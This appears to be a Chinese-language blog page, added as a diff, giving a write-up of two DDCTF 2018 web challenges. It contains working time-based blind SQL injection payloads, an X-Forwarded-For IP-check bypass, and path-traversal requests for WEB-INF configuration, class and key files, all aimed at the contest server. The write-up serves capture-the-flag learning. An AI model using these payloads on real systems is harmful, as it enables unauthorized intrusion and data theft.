@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="DDCTF 2018 2道WEB WriteupWEB00 数据库的秘密step 1:index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过 step 2:绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payloada%&amp;#">
+<meta name="keywords" content="ddctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTF】DDCTF 2018 web writeup">
+<meta property="og:url" content="http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/index.html">
+<meta property="og:site_name" content="0kami&#39;s Blog">
+<meta property="og:description" content="DDCTF 2018 2道WEB WriteupWEB00 数据库的秘密step 1:index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过 step 2:绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payloada%&amp;#">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-04-21T12:59:18.387Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【CTF】DDCTF 2018 web writeup">
+<meta name="twitter:description" content="DDCTF 2018 2道WEB WriteupWEB00 数据库的秘密step 1:index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过 step 2:绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payloada%&amp;#">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【CTF】DDCTF 2018 web writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/05/28/suctf-part-web-writeup/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/04/15/hitb-xctf-2018-portion-web-writeup/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&text=【CTF】DDCTF 2018 web writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&is_video=false&description=【CTF】DDCTF 2018 web writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【CTF】DDCTF 2018 web writeup&body=Check out this article: http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&name=【CTF】DDCTF 2018 web writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF-2018-2道WEB-Writeup"><span class="toc-number">1.</span> <span class="toc-text">DDCTF 2018 2道WEB Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB00-数据库的秘密"><span class="toc-number">1.1.</span> <span class="toc-text">WEB00 数据库的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step-1"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">step 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-2"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">step 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-3"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">step 3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-4"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">step 4:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB01-专属链接"><span class="toc-number">1.2.</span> <span class="toc-text">WEB01 专属链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step-1-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">step 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-2-1"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">step 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-3-1"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">step 3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-4-1"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">step 4:</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【CTF】DDCTF 2018 web writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0kami's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-04-21T12:53:50.000Z" itemprop="datePublished">2018-04-21</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/ddctf/">ddctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="DDCTF-2018-2道WEB-Writeup"><a href="#DDCTF-2018-2道WEB-Writeup" class="headerlink" title="DDCTF 2018 2道WEB Writeup"></a>DDCTF 2018 2道WEB Writeup</h1><h2 id="WEB00-数据库的秘密"><a href="#WEB00-数据库的秘密" class="headerlink" title="WEB00 数据库的秘密"></a>WEB00 数据库的秘密</h2><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过</p>
+<h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payload<code>a%&#39; &amp;&amp; &#39;%&#39;=&#39;%</code>、<code>a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%</code>确定注入存在,想着用union直接提取出来，发现后台还有WAF，没绕过去，但是对于盲注，成功构造出了payload<code>a%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%</code>,发生5秒延迟。（后来想想其实可以用bool型盲注提取数据）</p>
+<h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>确认了author字段可以注入，但是这道题还有一个问题就是sha1校验，要想写脚本，必须先解决这个问题。研究了一下main.js，发现以类似<code>id=title=date=author=time=</code>的字符串sha1处理后后台校验</p>
+<h4 id="step-4"><a href="#step-4" class="headerlink" title="step 4:"></a>step 4:</h4><p>写脚本，主要包括sha1校验和时间盲注，贴一下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># 获取到库名 ddctf</span><br><span class="line">payload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># 获取到表名 message, ctf_key4</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># 获取到列名 ctf_key4:secvalue; message: id,title,author,time,status</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># 获取到flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="WEB01-专属链接"><a href="#WEB01-专属链接" class="headerlink" title="WEB01 专属链接"></a>WEB01 专属链接</h2><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>根据题目提示，题目只跟链接IP有关，所以主要有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.102:5050/welcom/uuid #主页 注意到上面有email:3814166715717836733@didichuxing.com </span><br><span class="line">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # 给了提示，只能下载.class,.ks,.ico,.xml文件</span><br><span class="line">http://116.85.48.102:5050/news/topFiveNews # 没用</span><br><span class="line">http://116.85.48.102:5050//flag/testflag/yourflag #访问报错，但是暴露了控制器路径com.didichuxing.ctf.controller.user.FlagController.java</span><br></pre></td></tr></table></figure></p>
+<h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2:"></a>step 2:</h4><p>那么接下来就是猜路径了，在github上找了个springmvc+mybatis的<a href="https://github.com/liyifeng1994/ssm" target="_blank" rel="noopener">项目</a>,经过测试，发现一下几个文件</p>
+<ul>
+<li>../../WEB-INF/web.xml # 得到WEB-INF/applicationContext.xml，com.didichuxing.ctf.listener.InitListener</li>
+<li>../../WEB-INF/applicationContext.xml # 得到classpath:mybatis/config.xml</li>
+<li>../../WEB-INF/classes/mybatis/config.xml # 得到mapper/FlagMapper.xml</li>
+<li>../../WEB-INF/classes/mapper/FlagMapper.xml # sql语句</li>
+<li>../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class</li>
+<li>../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class</li>
+<li>../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class</li>
+<li>../../WEB-INF/classes/sdl.ks # 密钥文件</li>
+<li>../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class</li>
+<li>../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class</li>
+</ul>
+<h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3:"></a>step 3:</h4><p>把上述的class文件<a href="http://www.javadecompilers.com/" target="_blank" rel="noopener">在线反编译</a>到java，阅读后发现flagController.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model)</span><br><span class="line">  &#123;</span><br><span class="line">    Flag flag = flagService.getFlagByEmail(email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>以用户的邮箱来获取加密的flag，邮箱就是首页上的邮箱，然后通过listener.java得到具体的加密过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class="line">String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class="line">byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line"></span><br><span class="line">Flag flago = new Flag();</span><br><span class="line">flago.setId(Integer.valueOf(id));</span><br><span class="line">flago.setFlag(byte2hex(data));</span><br><span class="line">flago.setEmail(byte2hex(e));</span><br><span class="line">flago.setOriginFlag(flag);</span><br><span class="line">flago.setUuid(uuid);</span><br><span class="line">flago.setOriginEmail(email);</span><br></pre></td></tr></table></figure>
+<p>可以看到Email被转化为16进制的形式，所以需要先对邮箱做处理，简单编写代码（后面放上来），得到8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27，以<code>http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27</code>请求后得到加密的flag。</p>
+<h4 id="step-4-1"><a href="#step-4-1" class="headerlink" title="step 4:"></a>step 4:</h4><p>接下来就是写代码解密flag了，因为密钥文件在手，只需编写程序即可，参考<a href="https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="noopener">https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a><br>需要注意的是这里用了私钥加密公钥解密。<br>解密后得到flag</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF-2018-2道WEB-Writeup"><span class="toc-number">1.</span> <span class="toc-text">DDCTF 2018 2道WEB Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB00-数据库的秘密"><span class="toc-number">1.1.</span> <span class="toc-text">WEB00 数据库的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step-1"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">step 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-2"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">step 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-3"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">step 3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-4"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">step 4:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB01-专属链接"><span class="toc-number">1.2.</span> <span class="toc-text">WEB01 专属链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step-1-1"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">step 1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-2-1"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">step 2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-3-1"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">step 3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-4-1"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">step 4:</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&text=【CTF】DDCTF 2018 web writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&is_video=false&description=【CTF】DDCTF 2018 web writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【CTF】DDCTF 2018 web writeup&body=Check out this article: http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&title=【CTF】DDCTF 2018 web writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2018/04/21/ddctf-2018-web-writeup/&name=【CTF】DDCTF 2018 web writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 0kami
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = '0kami';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
